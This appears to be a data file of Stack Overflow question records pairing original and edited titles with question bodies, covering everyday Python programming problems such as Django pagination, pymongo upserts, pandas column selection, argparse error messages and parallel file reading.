Paging in django - the original query string gets lost," I use the code from the documentation to paginate the data: And a page: But there's a bug here: when the url contains a query string and one clicks on the Pager, the original query string gets lost. For example: and then when one clicks on ""page2"", the url becomes instead of: I haven't found neither the standard, nor easy way to fix it. How can I do that?UPDATE:of course, the names of the parameters, their values and whether they exist or not is not known. <code>  try: data = paginator.page(request.GET.get('page'))except PageNotAnInteger: page = 1 data = paginator.page(1)except EmptyPage: data = paginator.page(paginator.num_pages) <div class=""pagination""> <span class=""step-links""> {% if data.has_previous %} <a href=""?page={{ data.previous_page_number }}"">previous</a> {% endif %} <span class=""current""> <b>Page</b> {{ data.number }} of {{ data.paginator.num_pages }} </span> {% if data.has_next %} <a href=""?page={{ data.next_page_number }}"">next</a> {% endif %} </span> </div> example.com?var1=33&var2=44 example.com?page=2 # var1=33&var2=44 is lost example.com?var1=33&var2=44&page=2 ",Pagination in django - the original query string gets lost
Trouble in choosing python package to implement websocket," I'm writing a python real-time chat feature embedded in a web app. I'm a little bit confused on the real time implementation. I need to push real time message to different users.I plan to use websocket but I'm not quite sure how to save those sockets into an array so that once a user send a message to server, the server can find the related socket and push the message.So any idea about this? Or what's the common way to implement real time chat feature?Thanks in advance. <code> ",Creating a real-time chat with Python and websocket
can't upsert a record using update_one (Python)," I want to add a record to the collection if the key doesn't already exist. I understand [MongoDB][1] offers the upsertfor this so I did a This seems to work. However in the Pymongo documentation it says that update is deprecated and use to update_one().But: Gives: I don't really understand why update_one is different and why I need to use a $ operator. Can anyone help? <code>  db.collection.update({""_id"":""key1""},{""_id"":""key1""},True) db.collection.update_one({""_id"":""key1""},{""_id"":""key1""},True) raise ValueError('update only works with $ operators')ValueError: update only works with $ operators",Why does upsert a record using update_one raise ValueError?
can't upsert a record using update_one," I want to add a record to the collection if the key doesn't already exist. I understand [MongoDB][1] offers the upsertfor this so I did a This seems to work. However in the Pymongo documentation it says that update is deprecated and use to update_one().But: Gives: I don't really understand why update_one is different and why I need to use a $ operator. Can anyone help? <code>  db.collection.update({""_id"":""key1""},{""_id"":""key1""},True) db.collection.update_one({""_id"":""key1""},{""_id"":""key1""},True) raise ValueError('update only works with $ operators')ValueError: update only works with $ operators",Why does upsert a record using update_one raise ValueError?
Can't upsert a record using update_one," I want to add a record to the collection if the key doesn't already exist. I understand [MongoDB][1] offers the upsertfor this so I did a This seems to work. However in the Pymongo documentation it says that update is deprecated and use to update_one().But: Gives: I don't really understand why update_one is different and why I need to use a $ operator. Can anyone help? <code>  db.collection.update({""_id"":""key1""},{""_id"":""key1""},True) db.collection.update_one({""_id"":""key1""},{""_id"":""key1""},True) raise ValueError('update only works with $ operators')ValueError: update only works with $ operators",Why does upsert a record using update_one raise ValueError?
Python: Inheriting from classes unpacked from a list," Say I have a list of class objects in Python (A, B, C) and I want to inherit from all of them when building class D, such as: Unfortunately I get a syntax error when I do this. How else can I accomplish it, other than by writing class D(A, B, C)? (There are more than three classes in my actual scenario) <code>  class A(object): passclass B(object): passclass C(object): passclasses = [A, B, C]class D(*classes): pass",Inheriting from classes unpacked from a list
Join all except last x in list Python 2," I have a list and want to join all except the last 2 entriesi.e. Output would then be 1, 2. How could I achieve this? <code>  x = [""1"", ""2"", ""3"", ""4""]print ', '.join(x[from 0 until -3])",Join all except last x in list
Join all except last x in list," I have a list and want to join all except the last 2 entriesi.e. Output would then be 1, 2. How could I achieve this? <code>  x = [""1"", ""2"", ""3"", ""4""]print ', '.join(x[from 0 until -3])",Join all except last x in list
How can I serialize a numpy array (e.g. to string) while preserving matrix dimensions?," numpy.array.tostring doesn't seem to preserve information about matrix dimensions (see this question), requiring the user to issue a call to numpy.array.reshape. Is there a way to serialize a numpy array to JSON format while preserving this information?Note: The arrays may contain ints, floats or bools. It's reasonable to expect a transposed array.Note 2: this is being done with the intent of passing the numpy array through a Storm topology using streamparse, in case such information ends up being relevant. <code> ",How can I serialize a numpy array while preserving matrix dimensions?
How can I serialize a numpy array (to JSON) while preserving matrix dimensions?," numpy.array.tostring doesn't seem to preserve information about matrix dimensions (see this question), requiring the user to issue a call to numpy.array.reshape. Is there a way to serialize a numpy array to JSON format while preserving this information?Note: The arrays may contain ints, floats or bools. It's reasonable to expect a transposed array.Note 2: this is being done with the intent of passing the numpy array through a Storm topology using streamparse, in case such information ends up being relevant. <code> ",How can I serialize a numpy array while preserving matrix dimensions?
How can I serialize a numpy array (for STORM) while preserving matrix dimensions?," numpy.array.tostring doesn't seem to preserve information about matrix dimensions (see this question), requiring the user to issue a call to numpy.array.reshape. Is there a way to serialize a numpy array to JSON format while preserving this information?Note: The arrays may contain ints, floats or bools. It's reasonable to expect a transposed array.Note 2: this is being done with the intent of passing the numpy array through a Storm topology using streamparse, in case such information ends up being relevant. <code> ",How can I serialize a numpy array while preserving matrix dimensions?
flask service add authentication in one place only," I'm using Flask-HTTPAuth to handle authentication in my app. I have a lot of views, and I don't want to add login_required to every one of them. How can I make login required by default? <code>  from flask.ext.httpauth import HTTPBasicAuthauth = HTTPBasicAuth()@auth.verify_passworddef verify_password(username, password): return username == '111' and password == '222'@app.route('/')@app.route('/home/')@auth.login_requireddef index(): return 'Hello'@app.route('/route2/')def route2(): return 'route2'app.secret_key = 'A0Zr98j/3yX R~XHH!jmN]LWX/,?RT'",Default login_required rather than adding decorator everywhere
How to select coloumns with same prefix with python pandas, I have a dataframe in python pandas. The structure of the dataframe is as the following: I would like to select the columns which begin with d. Is there a simple way to achieve this in python .  <code>  a b c d1 d2 d3 10 14 12 44 45 78,How to select columns from dataframe by regex
How to select coloumns from dataframe by regex, I have a dataframe in python pandas. The structure of the dataframe is as the following: I would like to select the columns which begin with d. Is there a simple way to achieve this in python .  <code>  a b c d1 d2 d3 10 14 12 44 45 78,How to select columns from dataframe by regex
How to obtain sound envelope using python?," Hello I new with python and also with sound signal analysis. I am trying to get the envelope of a birth song (zebra finch). It has a very rapid signal fluctuations and I tried with different approach. For instance I tried to plot the signal and get the envelope with the following code base on other examples that I found (I added comments on the code to understand it): Here I tried two things, the first is use the resample function from scipy to get the envelope, but I have some problem with the signal amplitude that I don't understand yet (I uploaded the image obtained with the fourier technique but system does not allow me):The second is to use the hilbert transform to get the envelope (now I uploaded the image with the hilbert transform again the system does not allow me) It is possible to run my code and obtain the two images. But ill put the with this link http://ceciliajarne.web.unq.edu.ar/?page_id=92&preview=trueNow the ""envelope"" fails again. I tried filtering the signal as i saw in some examples, but my signal is attenuated and i am not able to obtain the envelope. Could anybody help my with my code or with a better idea to get the envelope? It is possible to use as example any bird song (I can give you mine), but i need to see what happen with complex sounds not simple signals, because it is very different (with simple sounds both techniques are ok).I also tried to adap the code that I found in: http://nipy.org/nitime/examples/mtm_baseband_power.htmlBut I am not able to get the proper parameters for my signal, and i don't understand the modulation part. I already ask to the code developers, and til waiting the answer. <code>  #Import the librariesfrom pylab import *import numpyimport scipy.signal.signaltools as sigtoolimport scipy, pylabfrom scipy.io import wavfileimport wave, structimport scipy.signal as signal#Open the txt file and read the wave file (also save it as txt file)f_out = open('mike_1_44100_.txt', 'w')w = scipy.io.wavfile.read(""mike_1_44100_.wav"") #here your sound filea=w[1]f_out.write('#time #z' + '\n')#I print to checkprint 'vector w'print w[0],w[1]print wi=w[1].sizep=numpy.arange(i)*0.0000226 #to properly define the time signal with the sample rateprint 'vector p:'print p x=numpy.dstack([p,a])print 'vector x:'print x[0]#saving filenumpy.savetxt('mike_1_44100_.txt',x[0])f_out.close()print 'i:'print i# num is the number of samples in the resampled signal.num= np.ceil(float(i*0.0000226)/0.0015)print numy_resample, x_resample = scipy.signal.resample(numpy.abs(a),num, p,axis=0, window=('gaussian',150))#y_resample, x_resample = scipy.signal.resample(numpy.abs(a), num, p,axis=-1, window=0)#Aplaying a filter W1=float(5000)/(float(44100)/2) #the frequency for the cut over the sample frequency(b, a1) = signal.butter(4, W1, btype='lowpass')aaa=aslp =1* signal.filtfilt(b, a1, aaa)#Taking the abs value of the signal the resample and finaly aplying the hilbert transformy_resample2 =numpy.sqrt(numpy.abs(np.imag(sigtool.hilbert(slp, axis=-1)))**2+numpy.abs(np.real(sigtool.hilbert(slp, axis=-1)))**2)print 'x sampled'#print x_resampleprint 'y sampled'#print y_resamplexx=x_resample #[0]yy=y_resample #[1]#ploting with some styleplot(p,a,label='Time Signal') #to plot amplitud vs time#plot(p,numpy.abs(a),label='Time signal')plot(xx,yy,label='Resampled time signal Fourier technique Gauss window 1.5 ms ', linewidth=3)#plot(ww,label='Window', linewidth=3)#plot(p,y_resample2,label='Hilbert transformed sime signal', linewidth=3)grid(True)pylab.xlabel(""time [s]"")pylab.ylabel(""Amplitde"")legend()show()",How to obtain sound envelope using python
Parallelising a for loop in Python," I am in the process of migrating from MATLAB to Python, mainly because of the vast number of interesting Machine Learning packages available in Python. But one of the issues which have been the source of confusion for me, is parallel processing. In particular, I want to read thousand of text files from disk in a for loop and I want to do it in parallel. In MATLAB, using parfor instead of for will do the trick, but so far I haven't been able to figure out how to do this in python. Here is an example of what I want to do. I want to read N text files, shape them into a N1xN2 array, and save each one into a a NxN1xN2 numpy array. And this array will be what I return from a function. Assuming the file names are file0001.dat, file0002.dat, etc., the code I like to parallelise is as follows: I run the codes on a cluster, so I can use many processors for the job. Hence, any comment on which of the parallelisation methods is more suitable for my task (if there are more than one) is most welcome. NOTE: I am aware of this post, but in that post, there are only out1, out2, out3 variables to worry about, and they have been used explicitly as arguments of a function to be parallelised. But here, I have many 2D arrays that should be read from file and saved into a 3D array. So, the answer to that question is not general enough for my case (or that is how I understood it).  <code>  import numpy as npN=10000N1=200N2=100result = np.empty([N, N1, N2])for counter in range(N): t_str=""%.4d"" % counter filename = 'file_'+t_str+'.dat' temp_array = np.loadtxt(filename) temp_array.shape=[N1,N2] result[counter,:,:]=temp_array",Reading files from disk in Python in Parallel
python argparse exception handling," I want to generate custom error messages for particular usage errors in my command-line program that uses the argparse library. I know I can override the general presentation of the error by subclassing argparse.ArgumentParser: But when my error method is called, message has already been formatted by the library. For example, How can I change how the stuff after error: is presented, for instance to ? <code>  class HelpParser(argparse.ArgumentParser): def error(self, message): sys.stderr.write('error: %s\n' % message) sys.exit(2)parser = HelpParser(... ...)args = parser.parse_args() > python prog.py old stuffusage: prog [-h] {hot,cold,rain,snow} ...prog: error: argument subparser: invalid choice: 'old' (choose from u'hot', u'cold', u'rain', u'snow') usage: prog [-h] {hot,cold,rain,snow} ...error: 'old' is not a valid option. select from 'hot', 'cold', 'rain', 'snow'",python argparse -- customizing error messages
Equivalent of insertIntoJDBC in PySpark, The goal of this question is to document:steps required to read and write data using JDBC connections in PySparkpossible issues with JDBC sources and know solutionsWith small changes these methods should work with other supported languages including Scala and R.  <code> ,How to use JDBC source to write and read data in (Py)Spark?
How can I save data using JDBC in PySpark?, The goal of this question is to document:steps required to read and write data using JDBC connections in PySparkpossible issues with JDBC sources and know solutionsWith small changes these methods should work with other supported languages including Scala and R.  <code> ,How to use JDBC source to write and read data in (Py)Spark?
How to save data using JDBC connection in PySpark?, The goal of this question is to document:steps required to read and write data using JDBC connections in PySparkpossible issues with JDBC sources and know solutionsWith small changes these methods should work with other supported languages including Scala and R.  <code> ,How to use JDBC source to write and read data in (Py)Spark?
How to use JDBC source to write and read data in PySpark?, The goal of this question is to document:steps required to read and write data using JDBC connections in PySparkpossible issues with JDBC sources and know solutionsWith small changes these methods should work with other supported languages including Scala and R.  <code> ,How to use JDBC source to write and read data in (Py)Spark?
Convert rust vector of tuples to C compatible structure," Following these answers, I've currently defined a Rust 1.0 function as follows, in order to be callable from Python using ctypes: And I'm setting up the Python part like so: This seems to be OK, but I'm:Not sure how to transform combined (a Vec<(i32, i32)>) to a C-compatible structure, so it can be returned to my Python script.Not sure whether I should be returning a reference (return &combined?) and how I would have to annotate the function with the appropriate lifetime specifier if I did <code>  use std::vec;extern crate libc;use libc::{c_int, c_float, size_t};use std::slice;#[no_mangle]pub extern fn convert_vec(input_lon: *const c_float, lon_size: size_t, input_lat: *const c_float, lat_size: size_t) -> Vec<(i32, i32)> { let input_lon = unsafe { slice::from_raw_parts(input_lon, lon_size as usize) }; let input_lat = unsafe { slice::from_raw_parts(input_lat, lat_size as usize) }; let combined: Vec<(i32, i32)> = input_lon .iter() .zip(input_lat.iter()) .map(|each| convert(*each.0, *each.1)) .collect(); return combined} from ctypes import *class Int32_2(Structure): _fields_ = [(""array"", c_int32 * 2)]rust_bng_vec = lib.convert_vec_pyrust_bng_vec.argtypes = [POINTER(c_float), c_size_t, POINTER(c_float), c_size_t]rust_bng_vec.restype = POINTER(Int32_2)",Convert Rust vector of tuples to a C compatible structure
How can i add comment in yaml file in Python," I am writing a YAML file using https://pypi.python.org/pypi/ruamel.yamlThe code is like this: I just want to add comment at the top like: Before the YAML data. <code>  import ruamel.yamlfrom ruamel.yaml.comments import CommentedSeqd = {}for m in ['B1', 'B2', 'B3']: d2 = {} for f in ['A1', 'A2', 'A3']: d2[f] = CommentedSeq(['test', 'test2']) if f != 'A2': d2[f].fa.set_flow_style() d[m] = d2 with open('test.yml', ""w"") as f: ruamel.yaml.dump( d, f, Dumper=ruamel.yaml.RoundTripDumper, default_flow_style=False, width=50, indent=8) # Data for Class A",How can I add a comment to a YAML file in Python
How can I add comment in yaml file in Python," I am writing a YAML file using https://pypi.python.org/pypi/ruamel.yamlThe code is like this: I just want to add comment at the top like: Before the YAML data. <code>  import ruamel.yamlfrom ruamel.yaml.comments import CommentedSeqd = {}for m in ['B1', 'B2', 'B3']: d2 = {} for f in ['A1', 'A2', 'A3']: d2[f] = CommentedSeq(['test', 'test2']) if f != 'A2': d2[f].fa.set_flow_style() d[m] = d2 with open('test.yml', ""w"") as f: ruamel.yaml.dump( d, f, Dumper=ruamel.yaml.RoundTripDumper, default_flow_style=False, width=50, indent=8) # Data for Class A",How can I add a comment to a YAML file in Python
Python 3.3 TypeError: can't use a string pattern on a bytes-like object in re.findall()," I am trying to learn how to automatically fetch urls from a page. In the following code I am trying to get the title of the webpage: And I get this unexpected error: What am I doing wrong? <code>  import urllib.requestimport reurl = ""http://www.google.com""regex = r'<title>(,+?)</title>'pattern = re.compile(regex)with urllib.request.urlopen(url) as response: html = response.read()title = re.findall(pattern, html)print(title) Traceback (most recent call last): File ""path\to\file\Crawler.py"", line 11, in <module> title = re.findall(pattern, html) File ""C:\Python33\lib\re.py"", line 201, in findall return _compile(pattern, flags).findall(string)TypeError: can't use a string pattern on a bytes-like object",TypeError: can't use a string pattern on a bytes-like object in re.findall()
Python : group list items in a dict," I want to generate a dictionary from a list of dictionaries, grouping list items by the value of some key, such as: So far I've found two ways of doing this. The first simply iterates over the list, create sublists in the dict for each key value and append elements matching these keys to the sublist : And another using itertools.groupby: I wonder which alternative is the most efficient ?Is there any more pythonic/concise or better performing way of achieving this ? <code>  input_list = [ {'a':'tata', 'b': 'foo'}, {'a':'pipo', 'b': 'titi'}, {'a':'pipo', 'b': 'toto'}, {'a':'tata', 'b': 'bar'}]output_dict = { 'pipo': [ {'a': 'pipo', 'b': 'titi'}, {'a': 'pipo', 'b': 'toto'} ], 'tata': [ {'a': 'tata', 'b': 'foo'}, {'a': 'tata', 'b': 'bar'} ]} l = [ {'a':'tata', 'b': 'foo'}, {'a':'pipo', 'b': 'titi'}, {'a':'pipo', 'b': 'toto'}, {'a':'tata', 'b': 'bar'} ]res = {}for e in l: res[e['a']] = res.get(e['a'], []) res[e['a']].append(e) import itertoolsfrom operator import itemgetterl = [ {'a':'tata', 'b': 'foo'}, {'a':'pipo', 'b': 'titi'}, {'a':'pipo', 'b': 'toto'}, {'a':'tata', 'b': 'bar'}]l = sorted(l, key=itemgetter('a'))res = dict((k, list(g)) for k, g in itertools.groupby(l, key=itemgetter('a')))",Python: group list items in a dict
Union of values of two dictionaries merged by key - Python 2.7," I have two dictionaries: How do I merge these two dictionaries to get such result: This works when values of the dictionary are simple type like int or str: But I have no idea how deal with lists as values...Notice: my question is different to How to merge two Python dictionaries in a single expression? cause I don't want to update values but add them <code>  d1 = {'a':('x','y'),'b':('k','l')}d2 = {'a':('m','n'),'c':('p','r')} d3 = {'a':('x','y','m','n'),'b':('k','l'),'c':('p','r')} d3 = dict([(i,a[i]+b[i]) for i in set(a.keys()+b.keys())])",Union of values of two dictionaries merged by key
django-rest-fraemwork accept JSON data?," I have created RESTFul APIs using django-rest-framework. The user endpoint is: /api/v1/usersI want to create a new user, so I send the user data in JSON format: I am using Google Chrome extension Postman to test the API. But, after sending the request, the user data is not saving. The response contains this error: This is what the request details look like in Postman: <code>  { ""username"": ""Test1"", ""email"": ""test1@gmail.com"", ""first_name"": ""Test1"", ""last_name"": ""Test2"", ""password"":""12121212""} { ""detail"": ""Unsupported media type \""text/plain;charset=UTF-8\"" in request.""}",django-rest-framework accept JSON data?
Strange Python memory usage," I wrote a scripts that logs mac addresses from pcapy into mysql through SQLAlchemy, I initially used straight sqlite3 but soon realized that something better was required, so this weekend that past I rewrote all the database talk to comply with SQLAlchemy. All works fine, data goes in and comes out again. I though the sessionmaker() would be very useful to manage all the sessions to the DB for me. I see a strange occurrence with regards to memory consumption. I start the script... it collects and writes all to DB... but for every 2-4seconds I have a Megabyte in size increase in memory consumption. At the moment I'm talking about very few records, sub-100 rows.Script Sequence: Script StartsSQLAlchemy reads mac_addr column into maclist[].scapy gets packet > if new_mac is in maclist[]?if true? only write timestamp to timestamp column where mac = newmac. back to Step 2.if false? then write new mac to DB. clear maclist[] and call step 2 again. After 1h30m I have a memory footprint of 1027MB (RES) and 1198MB (VIRT) with 124 rows in the 1 table database (MySQL). Q: Could this be contributed to the maclist[] being cleaned and repopulated from DB everytime? Q: Whats going to happen when it reaches system Max memory?Any ideas or advice would be great thanks. memory_profiler output for the segment in question where list[] gets populated from database mac_addr column. You will see observedclients is the list in question.  <code>  Line # Mem usage Increment Line Contents================================================ 123 1025.434 MiB 0.000 MiB @profile 124 def sniffmgmt(p): 125 global __mac_reel 126 global _blacklist 127 1025.434 MiB 0.000 MiB stamgmtstypes = (0, 2, 4) 128 1025.434 MiB 0.000 MiB tmplist = [] 129 1025.434 MiB 0.000 MiB matching = [] 130 1025.434 MiB 0.000 MiB observedclients = [] 131 1025.434 MiB 0.000 MiB tmplist = populate_observed_list() 132 1025.477 MiB 0.043 MiB for i in tmplist: 133 1025.477 MiB 0.000 MiB observedclients.append(i[0]) 134 1025.477 MiB 0.000 MiB _mac_address = str(p.addr2) 135 1025.477 MiB 0.000 MiB if p.haslayer(Dot11): 136 1025.477 MiB 0.000 MiB if p.type == 0 and p.subtype in stamgmtstypes: 137 1024.309 MiB -1.168 MiB _timestamp = atimer() 138 1024.309 MiB 0.000 MiB if p.info == """": 139 1021.520 MiB -2.789 MiB _SSID = ""hidden"" 140 else: 141 1024.309 MiB 2.789 MiB _SSID = p.info 142 143 1024.309 MiB 0.000 MiB if p.addr2 not in observedclients: 144 1018.184 MiB -6.125 MiB db_add(_mac_address, _timestamp, _SSID) 145 1018.184 MiB 0.000 MiB greetings() 146 else: 147 1024.309 MiB 6.125 MiB add_time(_mac_address, _timestamp) 148 1024.309 MiB 0.000 MiB observedclients = [] #clear the list 149 1024.309 MiB 0.000 MiB observedclients = populate_observed_list() #repopulate the list 150 1024.309 MiB 0.000 MiB greetings()",Strange Python memory usage with Scapy
Pandas Column mathematical operations," I am trying to perform some simple mathematical operations on the files.The columns in below file_1.csv are dynamic in nature the number of columns will increased from time to time. So we cannot have fixed last_column master_ids.csv : Before any pre-processing master_count.csv : Before any processing master_Ids.csv : after one pre-processing master_count.csv: expected Output (Append/merge) Eg: Ids: 1234 appears 2 times so the value of ids:1234 at current time (00:30:00) is 500 which is to be divided by count of ids occurrence and then add to the corresponding values from ref1 and create a new column with the current time.master_Ids.csv : After another pre-processing master_count.csv: expected output after another execution (Merge/append) So here current time is 00:45:00, and we divide the current time value by the count of ids occurrences, and then add to the corresponding ref1 values by creating an new column with new current time.Program: By Jianxun Li The program executes with no errors and no output. Need some fixing suggestions please.  <code>  Ids,ref0 #the columns increase dynamically1234,10008435,52432341,5637352,345 Ids,Name,lat,lon,ref11234,London,40.4,10.1,5008435,Paris,50.5,20.2,4002341,NewYork,60.6,30.3,7007352,Japan,70.7,80.8,5001234,Prague,40.4,10.1,1008435,Berlin,50.5,20.2,2002341,Austria,60.6,30.3,5007352,China,70.7,80.8,300 Ids,ref,00:30:001234,1000,5008435,5243,3002341,563,4007352,345,500 Ids,Name,lat,lon,ref1,00:30:001234,London,40.4,10.1,500,7508435,Paris,50.5,20.2,400,5502341,NewYork,60.6,30.3,700,9007352,Japan,70.7,80.8,500,7501234,Prague,40.4,10.1,100,3508435,Berlin,50.5,20.2,200,3502341,Austria,60.6,30.3,500,7007352,China,70.7,80.8,300,750 Ids,ref,00:30:00,00:45:001234,1000,500,1008435,5243,300,2002341,563,400,4007352,345,500,600 Ids,Name,lat,lon,ref1,00:30:00,00:45:001234,London,40.4,10.1,500,750,5508435,Paris,50.5,20.2,400,550,5002341,NewYork,60.6,30.3,700,900,9007352,Japan,70.7,80.8,500,750,8001234,Prague,40.4,10.1,100,350,1508435,Berlin,50.5,20.2,200,350,3002341,Austria,60.6,30.3,500,700,7007352,China,70.7,80.8,300,750,600 import pandas as pdimport numpy as npcsv_file1 = '/Data_repository/master_ids.csv'csv_file2 = '/Data_repository/master_count.csv'df1 = pd.read_csv(csv_file1).set_index('Ids')# need to sort index in file 2df2 = pd.read_csv(csv_file2).set_index('Ids').sort_index()# df1 and df2 has a duplicated column 00:00:00, use df1 without 1st columntemp = df2.join(df1.iloc[:, 1:])# do the division by number of occurence of each Ids # and add column any time seriesdef my_func(group): num_obs = len(group) # process with column name after next timeseries (inclusive) group.iloc[:,4:] = (group.iloc[:,4:]/num_obs).add(group.iloc[:,3], axis=0) return groupresult = temp.groupby(level='Ids').apply(my_func)",Pandas Column mathematical operations No error no answer
Python pandas read_sql errors," I am pulling data from Oracle db using pyodbc and pandas read_sql.I see no errors when I enter this line But when I try to see I get this error My search as to what this error means or what could be causing it yielded no satisfactory answers. The reason for using chunksize is that I have a Oracle db table with 60 million rows, and plan to download in bits and then put them together, just like here: How to create a large pandas dataframe from an sql query without running out of memory? <code>  df = pd.read_sql(sql_str,cnxn,chunksize=10) df <generator object _query_iterator at 0x092D40F8>",Python pandas read_sql returns generator object
How to move to and from an on-disk database to in-memory database," Python's sqlite3 :memory: option provides speedier queries and updates than the equivalent on-disk database. How can I load a disk-based database into memory, do fast operations on it, and then write the updated version back to disk?The question How to browse an in memory sqlite database in python seems related but it focuses on how to use a disk-based browsing tool on an in-memory db. The question How can I copy an in-memory SQLite database to another in-memory SQLite database in Python? is also related but it is specific to Django.My current solution is to read all of the tables, one-at-a-time, from the disk-based database into lists of tuples, then manually recreate the entire database schema for the in-memory db, and then load the data from the lists of tuples into the in-memory db. After operating on the data, the process is reversed.There must be a better way! <code> ",Moving back and forth between an on-disk database and a fast in-memory database?
Use Multiple Character Delimiter in Python Pandas to_csv," It appears that the pandas read_csv function only allows single character delimiters/separators. Is there some way to allow for a string of characters to be used like, ""*|*"" or ""%%"" instead? <code> ",Use Multiple Character Delimiter in Python Pandas read_csv
Could anyone who understand about Python and MPI help me?," I'm new in MPI using Python and I'm having some issues here. This is my code: I want to print: From process PROCESS_NUMBER, sum = 3 Process 0 prints correctly, but process 1 prints None. I can't understand why. Could anyone help me? <code>  from mpi4py import MPIcomm = MPI.COMM_WORLDrank = comm.Get_rank()if rank == 0: a = 1 comm.bcast(a, root=0) s = comm.reduce(a, op=MPI.SUM) print 'From process 0, sum =', selif rank == 1: b = 2 comm.bcast(b, root=1) x = comm.reduce(b, op=MPI.SUM) print 'From process 1, sum =', x",Unexpected output from mpi4py program
How to be confident that python 2.7.10 doesn't break my python 2.7.6 code?," To simplify my work I want to migrate from Python 2.7.6 To Python 2.7.9/2.7.10.I need to justify that my Python 2.7.10 Will not break my software ""working"" with Python 2.7.6I followed the steps describe in porting python 2 to python 3Increase my test coverage from 0 to 40%run pylint (no critical bug)Learn the differences between Python 2.7.10 And 2.7.6 < I read the release notesI can't be sure 100% that my code will not break, but how can I be confident? For example, should I have to look at all the Core and Builtins bugs fixed between 2.7.6 And 2.7.10 And search into my code if we use those methods? Does exists a better strategy?100% code coverage is a good solution, but it may be harder to obtain than 50% coverage + 100% code using modified methods between 2.7.6 And 2.7.10 Are tested. <code> ",How to be confident that Python 2.7.10 Doesn't break my Python 2.7.6 Code?
How can i download a webpage in python program.," Currently I have a script that can only download the HTML of a given page. Now I want to download all the files of the web page including HTML, CSS, JS and image files (same as we get with a ctrl-s of any website).My current code is: I visited many questions but they are all only downloading the HTML. <code>  import urlliburl = ""https://en.wikipedia.org/wiki/Python_%28programming_language%29""urllib.urlretrieve(url, ""t3.html"")",How to download a full webpage with a Python script?
How can I download a webpage's files in a Python program?," Currently I have a script that can only download the HTML of a given page. Now I want to download all the files of the web page including HTML, CSS, JS and image files (same as we get with a ctrl-s of any website).My current code is: I visited many questions but they are all only downloading the HTML. <code>  import urlliburl = ""https://en.wikipedia.org/wiki/Python_%28programming_language%29""urllib.urlretrieve(url, ""t3.html"")",How to download a full webpage with a Python script?
How can I download full webpage by a Python program?," Currently I have a script that can only download the HTML of a given page. Now I want to download all the files of the web page including HTML, CSS, JS and image files (same as we get with a ctrl-s of any website).My current code is: I visited many questions but they are all only downloading the HTML. <code>  import urlliburl = ""https://en.wikipedia.org/wiki/Python_%28programming_language%29""urllib.urlretrieve(url, ""t3.html"")",How to download a full webpage with a Python script?
How download a full webpage with a Python script?," Currently I have a script that can only download the HTML of a given page. Now I want to download all the files of the web page including HTML, CSS, JS and image files (same as we get with a ctrl-s of any website).My current code is: I visited many questions but they are all only downloading the HTML. <code>  import urlliburl = ""https://en.wikipedia.org/wiki/Python_%28programming_language%29""urllib.urlretrieve(url, ""t3.html"")",How to download a full webpage with a Python script?
Google AppEngine ImportError: dynamic module does not define init function (init_mysql)," I am getting this error when I deployed my python app with Flask on Google AppEngine. I will be grateful if someone help me.ps: My local server works like a charm <code>  File ""/base/data/home/apps/s~dwnup-997/1.385507214687998146/lib/sqlalchemy/dialects/mysql/mysqldb.py"", line 92, in dbapi return __import__('MySQLdb') File ""/base/data/home/apps/s~dwnup-997/1.385507214687998146/lib/MySQLdb/__init__.py"", line 19, in <module> import _mysqlImportError: dynamic module does not define init function (init_mysql)",Google AppEngine ImportError: dynamic module does not define init function (init_mysql)
(SOLVED) Google AppEngine ImportError: dynamic module does not define init function (init_mysql)," I am getting this error when I deployed my python app with Flask on Google AppEngine. I will be grateful if someone help me.ps: My local server works like a charm <code>  File ""/base/data/home/apps/s~dwnup-997/1.385507214687998146/lib/sqlalchemy/dialects/mysql/mysqldb.py"", line 92, in dbapi return __import__('MySQLdb') File ""/base/data/home/apps/s~dwnup-997/1.385507214687998146/lib/MySQLdb/__init__.py"", line 19, in <module> import _mysqlImportError: dynamic module does not define init function (init_mysql)",Google AppEngine ImportError: dynamic module does not define init function (init_mysql)
Is this parsing a json naively into a Python class secure?," Some background first: I have a few rather simple data structures which are persisted as json files on disk. These json files are shared between applications of different languages and different environments (like web frontend and data manipulation tools). For each of the files I want to create a Python ""POPO"" (Plain Old Python Object), and a corresponding data mapper class for each item should implement some simple CRUD like behavior (e.g. save will serialize the class and store as json file on disk). I think a simple mapper (which only knows about basic types) will work. However, I'm concerned about security. Some of the json files will be generated by a web frontend, so a possible security risk if a user feeds me some bad json.Finally, here is the simple mapping code (found at How to convert JSON data into a Python object): What possible security issues do you see?NB: I'm new to Python. Edit: Thanks all for your comments. I've found out that I have one json where I have 2 arrays, each having a map. Unfortunately this starts to look like it gets cumbersome when I get more of these. I'm extending the question to mapping a json input to a recordtype. The original code is from here: https://stackoverflow.com/a/15882054/1708349.Since I need mutable objects, I'd change it to use a namedlist instead of a namedtuple: Is it still safe? <code>  class User(object):def __init__(self, name, username): self.name = name self.username = usernameimport jsonj = json.loads(your_json)u = User(**j) import jsonfrom namedlist import namedlistdata = '{""name"": ""John Smith"", ""hometown"": {""name"": ""New York"", ""id"": 123}}'# Parse JSON into an object with attributes corresponding to dict keys.x = json.loads(data, object_hook=lambda d: namedlist('X', d.keys())(*d.values()))print x.name, x.hometown.name, x.hometown.id",Is parsing a json naively into a Python class or struct secure?
Is this parsing a json naively into a Python class or recordtype secure?," Some background first: I have a few rather simple data structures which are persisted as json files on disk. These json files are shared between applications of different languages and different environments (like web frontend and data manipulation tools). For each of the files I want to create a Python ""POPO"" (Plain Old Python Object), and a corresponding data mapper class for each item should implement some simple CRUD like behavior (e.g. save will serialize the class and store as json file on disk). I think a simple mapper (which only knows about basic types) will work. However, I'm concerned about security. Some of the json files will be generated by a web frontend, so a possible security risk if a user feeds me some bad json.Finally, here is the simple mapping code (found at How to convert JSON data into a Python object): What possible security issues do you see?NB: I'm new to Python. Edit: Thanks all for your comments. I've found out that I have one json where I have 2 arrays, each having a map. Unfortunately this starts to look like it gets cumbersome when I get more of these. I'm extending the question to mapping a json input to a recordtype. The original code is from here: https://stackoverflow.com/a/15882054/1708349.Since I need mutable objects, I'd change it to use a namedlist instead of a namedtuple: Is it still safe? <code>  class User(object):def __init__(self, name, username): self.name = name self.username = usernameimport jsonj = json.loads(your_json)u = User(**j) import jsonfrom namedlist import namedlistdata = '{""name"": ""John Smith"", ""hometown"": {""name"": ""New York"", ""id"": 123}}'# Parse JSON into an object with attributes corresponding to dict keys.x = json.loads(data, object_hook=lambda d: namedlist('X', d.keys())(*d.values()))print x.name, x.hometown.name, x.hometown.id",Is parsing a json naively into a Python class or struct secure?
